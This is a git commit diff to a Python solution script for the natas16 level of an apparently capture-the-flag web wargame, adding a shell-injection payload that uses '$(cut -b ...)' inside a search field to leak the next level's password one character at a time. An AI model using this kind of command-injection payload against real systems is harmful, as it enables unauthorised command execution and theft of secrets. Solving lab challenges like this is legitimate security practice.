604f593215b1512ac00c63603e81f74d41caaa08
Evan Johnson <evanj2357@gmail.com>
2021-06-22 16:29:43 -0700

    working extraction of single alphabetic characters

--- solutions/natas16.py
+++ solutions/natas16.py
@@ -3,7 +3,9 @@ natas16: shell injection, more filtering
 """
 
 import requests
-from typing import Optional
+import urllib.parse
+from bs4 import BeautifulSoup
+from typing import List, Optional
 
 from natas_utils import *
 
@@ -12,12 +14,30 @@ LEVEL = 16
 def solve(url: str, login: LevelLogin) -> Optional[str]:
     flag_file_abspath = NATAS_DATA['flag_path'] + f"natas{LEVEL + 1}"
 
-    payload = f"$(echo aa)" # "$(cat {flag_file_abspath} > dictionary.txt)"
-    response = requests.post(url, auth=login, data={"needle": payload})
+    # the `cut` utility allows extraction of single bytes per line
+    # using 1-indexed offsets
+    i = 3
+    payload = f"^$(cut -b {i} {flag_file_abspath})"
 
+    params = {
+        "needle": payload,
+        "submit": "Search",
+    }
+    print(params)
+    response = requests.get(url, auth=login, params=params)
     print(response.text)
 
+    results = get_grep_output(response)
+    print(results)
+
+    # this will fail
     return try_level_login(LEVEL + 1, extract_candidate_passwords(response.text))
+
+def get_grep_output(response: requests.Response) -> List[str]:
+    soup = BeautifulSoup(response.text, "html.parser")
+
+    # results are in the only <pre> element on the page, one word per line
+    return soup.find("pre").text.split()
 
 if __name__ == "__main__":
     url, login = load_level(LEVEL)
